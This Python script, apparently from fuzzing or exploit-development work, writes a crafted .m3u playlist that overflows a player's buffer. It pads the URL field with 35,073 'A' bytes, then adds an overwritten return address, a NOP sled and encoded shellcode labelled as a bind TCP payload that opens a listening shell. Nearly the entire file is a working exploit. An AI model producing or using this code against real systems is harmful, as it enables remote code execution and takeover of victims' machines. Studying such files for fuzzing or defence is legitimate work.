#Static fields
header = '#EXTM3U\r\n'
line1 = '#EXTINF:123,Sample artist - Sample title\r\n'
url_part1 = 'http://'

#String field where modification occurs hence generating a mutant
junk1 = "\x41" *35073
eip = "\xEE\x2E\xC7\x77"
junk2 = "\x43" * 100
nops = "\x90" *16

#Buf generated from a bind tcp payload.

buf =  ""
buf += "\x33\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xac\xee\x9c\xca\x83\xee\xfc\xe2\xf4\x50\x06"
buf += "\x1e\xca\xac\xee\xfc\x43\x49\xdf\x5c\xae\x27\xbe\xac"
buf += "\x41\xfe\xe2\x17\x98\xb8\x65\xee\xe2\xa3\x59\xd6\xec"
buf += "\x9d\x11\x30\xf6\xcd\x92\x9e\xe6\x8c\x2f\x53\xc7\xad"
buf += "\x29\x7e\x38\xfe\xb9\x17\x98\xbc\x65\xd6\xf6\x27\xa2"
buf += "\x8d\xb2\x4f\xa6\x9d\x1b\xfd\x65\xc5\xea\xad\x3d\x17"
buf += "\x83\xb4\x0d\xa6\x83\x27\xda\x17\xcb\x7a\xdf\x63\x66"
buf += "\x6d\x21\x91\xcb\x6b\xd6\x7c\xbf\x5a\xed\xe1\x32\x97"
buf += "\x93\xb8\xbf\x48\xb6\x17\x92\x88\xef\x4f\xac\x27\xe2"
buf += "\xd7\x41\xf4\xf2\x9d\x19\x27\xea\x17\xcb\x7c\x67\xd8"
buf += "\xee\x88\xb5\xc7\xab\xf5\xb4\xcd\x35\x4c\xb1\xc3\x90"
buf += "\x27\xfc\x77\x47\xf1\x86\xaf\xf8\xac\xee\xf4\xbd\xdf"
buf += "\xdc\xc3\x9e\xc4\xa2\xeb\xec\xab\x11\x49\x72\x3c\xef"
buf += "\x9c\xca\x85\x2a\xc8\x9a\xc4\xc7\x1c\xa1\xac\x11\x49"
buf += "\xa0\xa4\xb7\xcc\x28\x51\xae\xcc\x8a\xfc\x86\x76\xc5"
buf += "\x73\x0e\x63\x1f\x3b\x86\x9e\xca\x8f\x6c\x15\x2c\xc6"
buf += "\xfe\xca\x9d\xc4\x2c\x47\xfd\xcb\x11\x49\x9d\xc4\x59"
buf += "\x75\xf2\x53\x11\x49\x9d\xc4\x9a\x70\xf1\x4d\x11\x49"
buf += "\x9d\x3b\x86\xe9\xa4\xe1\x8f\x63\x1f\xc4\x8d\xf1\xae"
buf += "\xac\x67\x7f\x9d\xfb\xb9\xad\x3c\xc6\xfc\xc5\x9c\x4e"
buf += "\x13\xfa\x0d\xe8\xca\xa0\xcb\xad\x63\xd8\xee\xbc\x28"
buf += "\x9c\x8e\xf8\xbe\xca\x9c\xfa\xa8\xca\x84\xfa\xb8\xcf"
buf += "\x9c\xc4\x97\x50\xf5\x2a\x11\x49\x43\x4c\xa0\xca\x8c"
buf += "\x53\xde\xf4\xc2\x2b\xf3\xfc\x35\x79\x55\x6c\x7f\x0e"
buf += "\xb8\xf4\x6c\x39\x53\x01\x35\x79\xd2\x9a\xb6\xa6\x6e"
buf += "\x67\x2a\xd9\xeb\x27\x8d\xbf\x9c\xf3\xa0\xac\xbd\x63"
buf += "\x1f"
payload = junk1 + eip + junk2 +nops + buf

#Static field
url_part2 = '.example.com/test.m3u'

#Specifying the location of the mutant.
exploit = open('MT88\mutant5.m3u','w')

#Defining what the mutant should include.
exploit.write(header+line1+url_part1+payload+url_part2)
